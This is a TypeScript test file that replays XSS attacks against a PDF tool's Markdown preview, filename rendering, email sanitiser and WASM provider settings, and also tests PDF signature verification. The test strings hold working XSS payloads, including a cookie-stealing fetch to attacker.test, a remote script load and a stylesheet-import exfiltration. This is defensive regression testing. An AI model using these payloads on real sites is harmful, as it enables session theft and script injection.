import { describe, it, expect, beforeEach, vi } from 'vitest';
import MarkdownIt from 'markdown-it';
import DOMPurify from 'dompurify';
import forge from 'node-forge';
import { escapeHtml, sanitizeEmailHtml } from '../js/utils/helpers';
import { validateSignature } from '../js/logic/validate-signature-pdf';
import type { ExtractedSignature } from '@/types';

function renderAsPreviewWould(markdown: string): string {
  const md = new MarkdownIt({
    html: true,
    breaks: false,
    linkify: true,
    typographer: true,
  });
  const raw = md.render(markdown);
  return DOMPurify.sanitize(raw, { ADD_ATTR: ['target'] });
}

function assertNoExecutableContent(html: string) {
  const doc = document.implementation.createHTMLDocument('x');
  const root = doc.createElement('div');
  root.innerHTML = html;
  doc.body.appendChild(root);

  const all = root.querySelectorAll('*');

  expect(
    root.querySelector('script'),
    `<script> survived:\n${html}`
  ).toBeNull();

  for (const el of Array.from(all)) {
    for (const attr of Array.from(el.attributes)) {
      expect(
        /^on/i.test(attr.name),
        `Element <${el.tagName.toLowerCase()}> has event handler ${attr.name}="${attr.value}" from:\n${html}`
      ).toBe(false);
      if (
        ['href', 'src', 'xlink:href', 'formaction', 'action'].includes(
          attr.name.toLowerCase()
        )
      ) {
        expect(
          /^\s*javascript:/i.test(attr.value),
          `Element <${el.tagName.toLowerCase()}> has ${attr.name}="${attr.value}" from:\n${html}`
        ).toBe(false);
      }
    }
  }

  const iframes = root.querySelectorAll('iframe[srcdoc]');
  expect(iframes.length, `<iframe srcdoc> survived:\n${html}`).toBe(0);
}

describe('XSS replay — Markdown-to-PDF preview path', () => {
  it('neutralizes the exact payload from the security report', () => {
    const payload = `# Quarterly Financial Report Q1 2026

## Executive Summary

Revenue growth exceeded expectations at 12.3% YoY.

<img src=x onerror="var s=document.createElement('script');s.src='http://127.0.0.1:9999/payload.js';document.head.appendChild(s)">

## Outlook

Management maintains FY2026 guidance.
`;
    const html = renderAsPreviewWould(payload);
    assertNoExecutableContent(html);
    const doc = document.implementation.createHTMLDocument('x');
    const root = doc.createElement('div');
    root.innerHTML = html;
    const img = root.querySelector('img');
    expect(img).not.toBeNull();
    expect(img?.getAttribute('onerror')).toBeNull();
  });

  it('strips <script> tags from raw markdown', () => {
    const html = renderAsPreviewWould(`<script>alert(1)</script>`);
    assertNoExecutableContent(html);
  });

  it('strips event-handler attributes from every HTML tag markdown-it passes through', () => {
    const html = renderAsPreviewWould(`
<svg onload="alert(1)"><text>x</text></svg>
<details ontoggle="alert(1)" open><summary>x</summary></details>
<body onfocus="alert(1)">
<input autofocus onfocus="alert(1)">
<video autoplay onloadstart="alert(1)"><source src=x></video>
<iframe srcdoc="<script>alert(1)</script>"></iframe>
<form><button formaction="javascript:alert(1)">x</button></form>
`);
    assertNoExecutableContent(html);
  });

  it('blocks javascript: href on plain markdown links', () => {
    const html = renderAsPreviewWould('[click me](javascript:alert(1))');
    assertNoExecutableContent(html);
  });

  it('blocks data: URLs in script contexts but preserves data: in images', () => {
    const html = renderAsPreviewWould(
      `![img](data:image/png;base64,AAAA)\n<script src="data:text/javascript,alert(1)"></script>`
    );
    assertNoExecutableContent(html);
    expect(html).toContain('src="data:image/png');
  });

  it('defeats attribute-injection via quote-breakout in markdown link titles', () => {
    const html = renderAsPreviewWould(
      '[x](https://example.com "a\\" onmouseover=alert(1) x=\\"")'
    );
    assertNoExecutableContent(html);
  });

  it('mermaid click directive with javascript: is stripped by SVG sanitizer', () => {
    const evilSvg = `<svg xmlns="http://www.w3.org/2000/svg">
      <a href="javascript:alert('mermaid click')"><rect width="10" height="10"/></a>
      <g onclick="alert(1)"><text>label</text></g>
      <foreignObject><body><img src=x onerror="alert(1)"></body></foreignObject>
      <script>alert(1)</script>
    </svg>`;
    const clean = DOMPurify.sanitize(evilSvg, {
      USE_PROFILES: { svg: true, svgFilters: true },
    });
    assertNoExecutableContent(clean);
    expect(clean).not.toMatch(/javascript:/i);
  });
});

describe('XSS replay — filename sink', () => {
  it('escapeHtml neutralizes an attacker-supplied .pdf filename before it reaches innerHTML', () => {
    const evilName = `<img src=x onerror="fetch('https://attacker.test/steal?d=' + btoa(document.cookie))">.pdf`;
    const rendered = `<p class="truncate font-medium text-white">${escapeHtml(evilName)}</p>`;
    const host = document.createElement('div');
    host.innerHTML = rendered;
    expect(host.querySelector('img')).toBeNull();
    expect(host.textContent).toContain(evilName);
  });

  it('createElement + textContent neutralizes the same payload (deskew/form-filler path)', () => {
    const evilName = `<img src=x onerror="alert(1)">.pdf`;
    const host = document.createElement('div');
    const span = document.createElement('span');
    span.textContent = evilName;
    host.appendChild(span);
    expect(host.querySelector('img')).toBeNull();
    expect(span.textContent).toBe(evilName);
  });
});

describe('XSS replay — WASM provider localStorage poisoning', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  it('the exact PoC payload writes attacker URLs to localStorage — audit the key shape', () => {
    const wasmPayload = {
      pymupdf: 'https://attacker.test/wasm/pymupdf/',
      ghostscript: 'https://attacker.test/wasm/gs/',
      cpdf: 'https://attacker.test/wasm/cpdf/',
    };
    localStorage.setItem(
      'bentopdf:wasm-providers',
      JSON.stringify(wasmPayload)
    );

    const stored = localStorage.getItem('bentopdf:wasm-providers');
    expect(stored).toContain('attacker.test');
  });

  it('WasmProvider scrubs the untrusted URLs on load and falls back to env defaults', async () => {
    localStorage.setItem(
      'bentopdf:wasm-providers',
      JSON.stringify({
        pymupdf: 'https://attacker.test/wasm/pymupdf/',
        ghostscript: 'https://attacker.test/wasm/gs/',
        cpdf: 'https://attacker.test/wasm/cpdf/',
      })
    );

    vi.resetModules();
    const { WasmProvider } = await import('../js/utils/wasm-provider');

    const got = WasmProvider.getUrl('pymupdf');
    expect(got).not.toContain('attacker.test');
    expect(got).toMatch(/cdn\.jsdelivr\.net|^https?:\/\/[^/]+\//);

    const remaining = JSON.parse(
      localStorage.getItem('bentopdf:wasm-providers') || '{}'
    );
    expect(remaining.pymupdf).toBeUndefined();
    expect(remaining.ghostscript).toBeUndefined();
    expect(remaining.cpdf).toBeUndefined();
  });
});

describe('XSS replay — CDN URL version pinning', () => {
  it('every WASM CDN default URL is pinned to an exact patch version', async () => {
    const { WasmProvider } = await import('../js/utils/wasm-provider');
    const urls = WasmProvider.getAllProviders();
    for (const [pkg, url] of Object.entries(urls)) {
      if (!url) continue;
      let hostname: string;
      try {
        hostname = new URL(url).hostname;
      } catch {
        continue;
      }
      if (hostname !== 'cdn.jsdelivr.net') continue;
      expect(
        /@\d+\.\d+\.\d+/.test(url),
        `${pkg} URL "${url}" must be pinned to an exact version (e.g. pkg@1.2.3)`
      ).toBe(true);
    }
  });
});

describe('XSS replay — sanitizeEmailHtml (DOMPurify-backed)', () => {
  it('strips <script> tags and event handlers that a regex sanitizer would miss', () => {
    const mutationPayloads = [
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<img/src=x/onerror=alert(1)>',
      '<svg><animate onbegin=alert(1) attributeName=x /></svg>',
      '<math><mo><a href=javascript:alert(1)>x</a></mo></math>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<object data="javascript:alert(1)"></object>',
      '<embed src="javascript:alert(1)">',
    ];
    for (const raw of mutationPayloads) {
      const out = sanitizeEmailHtml(raw);
      const doc = document.implementation.createHTMLDocument('x');
      const root = doc.createElement('div');
      root.innerHTML = out;
      expect(
        root.querySelector('script, iframe, object, embed, link'),
        `mutation payload survived: ${raw}\n-> ${out}`
      ).toBeNull();
      for (const el of Array.from(root.querySelectorAll('*'))) {
        for (const attr of Array.from(el.attributes)) {
          expect(/^on/i.test(attr.name), `event handler survived: ${raw}`).toBe(
            false
          );
          if (
            ['href', 'src'].includes(attr.name.toLowerCase()) &&
            /^\s*javascript:/i.test(attr.value)
          ) {
            throw new Error(`javascript: URL survived: ${raw}`);
          }
        }
      }
    }
  });

  it('strips <style> and <link> to avoid @import / external stylesheet exfil', () => {
    const out = sanitizeEmailHtml(
      '<html><head><style>@import url(http://attacker/steal);</style><link rel=stylesheet href=http://attacker></head><body>hi</body></html>'
    );
    expect(out).not.toMatch(/@import/i);
    expect(out.toLowerCase()).not.toContain('<style');
    expect(out.toLowerCase()).not.toContain('<link');
  });
});

describe('XSS replay — PDF signature cryptographic verification', () => {
  function buildSignedPdf(digestAlgorithm: string = forge.pki.oids.sha256): {
    pdfBytes: Uint8Array;
    byteRange: number[];
    p7Der: Uint8Array;
  } {
    const keys = forge.pki.rsa.generateKeyPair({ bits: 2048, e: 0x10001 });
    const cert = forge.pki.createCertificate();
    cert.publicKey = keys.publicKey;
    cert.serialNumber = '01';
    const attrs = [
      { name: 'commonName', value: 'Test Signer' },
      { name: 'countryName', value: 'US' },
    ];
    cert.setSubject(attrs);
    cert.setIssuer(attrs);
    cert.validity.notBefore = new Date(Date.now() - 86400000);
    cert.validity.notAfter = new Date(Date.now() + 365 * 86400000);
    cert.sign(keys.privateKey, forge.md.sha256.create());

    const contentBefore = '%PDF-1.4\nsigned content A\n';
    const contentAfter = '\nsigned content B\n%%EOF\n';
    const placeholderLen = 0;

    const signedContent = new TextEncoder().encode(
      contentBefore + contentAfter
    );

    const p7 = forge.pkcs7.createSignedData();
    p7.content = forge.util.createBuffer(String.fromCharCode(...signedContent));
    p7.addCertificate(cert);
    p7.addSigner({
      key: keys.privateKey,
      certificate: cert,
      digestAlgorithm,
      authenticatedAttributes: [
        { type: forge.pki.oids.contentType, value: forge.pki.oids.data },
        { type: forge.pki.oids.messageDigest },
        // @ts-expect-error runtime accepts Date, type defs say string
        { type: forge.pki.oids.signingTime, value: new Date() },
      ],
    });
    p7.sign({ detached: true });
    const p7Asn1 = p7.toAsn1();
    const p7Der = forge.asn1.toDer(p7Asn1).getBytes();
    const p7Bytes = new Uint8Array(p7Der.length);
    for (let i = 0; i < p7Der.length; i++) p7Bytes[i] = p7Der.charCodeAt(i);

    const beforeBytes = new TextEncoder().encode(contentBefore);
    const afterBytes = new TextEncoder().encode(contentAfter);
    const pdfBytes = new Uint8Array(
      beforeBytes.length + afterBytes.length + placeholderLen
    );
    pdfBytes.set(beforeBytes, 0);
    pdfBytes.set(afterBytes, beforeBytes.length);
    const byteRange = [
      0,
      beforeBytes.length,
      beforeBytes.length + placeholderLen,
      afterBytes.length,
    ];
    return { pdfBytes, byteRange, p7Der: p7Bytes };
  }

  it('flags untouched signed bytes as cryptoVerified=true', async () => {
    const { pdfBytes, byteRange, p7Der } = buildSignedPdf();
    const sig: ExtractedSignature = {
      index: 0,
      contents: p7Der,
      byteRange,
    };
    const result = await validateSignature(sig, pdfBytes);
    expect(result.cryptoVerified).toBe(true);
    expect(result.errorMessage).toBeUndefined();
  });

  it('flips a byte inside the signed range → cryptoVerified=false and isValid=false', async () => {
    const { pdfBytes, byteRange, p7Der } = buildSignedPdf();
    const tampered = new Uint8Array(pdfBytes);
    tampered[10] ^= 0xff;
    const sig: ExtractedSignature = {
      index: 0,
      contents: p7Der,
      byteRange,
    };
    const result = await validateSignature(sig, tampered);
    expect(result.cryptoVerified).toBe(false);
    expect(result.isValid).toBe(false);
    expect(result.errorMessage).toMatch(
      /hash does not match|does not verify|PDF was modified/i
    );
  });

  it('refuses MD5 as the digest algorithm even when bytes match', async () => {
    const { pdfBytes, byteRange, p7Der } = buildSignedPdf(forge.pki.oids.md5);
    const sig: ExtractedSignature = {
      index: 0,
      contents: p7Der,
      byteRange,
    };
    const result = await validateSignature(sig, pdfBytes);
    expect(result.usesInsecureDigest).toBe(true);
    expect(result.isValid).toBe(false);
  });
});
